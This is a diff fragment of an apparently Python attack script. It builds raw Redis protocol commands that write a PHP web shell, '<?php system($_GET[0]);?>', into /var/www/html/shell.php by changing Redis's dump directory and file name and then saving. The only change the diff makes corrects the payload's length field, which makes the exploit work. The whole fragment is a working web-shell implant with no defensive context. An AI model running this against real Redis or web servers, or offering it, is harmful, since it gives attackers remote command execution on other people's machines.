@@ -98,7 +98,7 @@ import urllib.parse
 
 # Redis 命令：设置 WebShell
 cmd = """
-*3\r\n$3\r\nSET\r\n$9\r\nshell.php\r\n$24\r\n<?php system($_GET[0]);?>\r\n
+*3\r\n$3\r\nSET\r\n$9\r\nshell.php\r\n$25\r\n<?php system($_GET[0]);?>\r\n
 *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n
 *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n
 *1\r\n$4\r\nSAVE\r\n
